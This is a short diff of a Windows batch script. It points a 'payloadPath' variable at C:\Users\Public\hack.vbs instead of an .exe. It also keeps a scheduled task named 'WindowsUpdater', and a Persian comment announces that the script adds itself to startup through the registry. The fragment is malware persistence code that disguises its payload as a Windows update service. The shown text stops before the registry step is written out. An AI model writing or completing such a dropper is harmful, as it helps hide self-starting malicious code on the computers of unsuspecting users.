@@ -1,5 +1,5 @@
 @echo off
-set payloadPath=C:\Users\Public\updater.exe
+set payloadPath=C:\Users\Public\hack.vbs
 set taskName=WindowsUpdater
 
 :: اضافه کردن به استارت‌آپ (Registry)
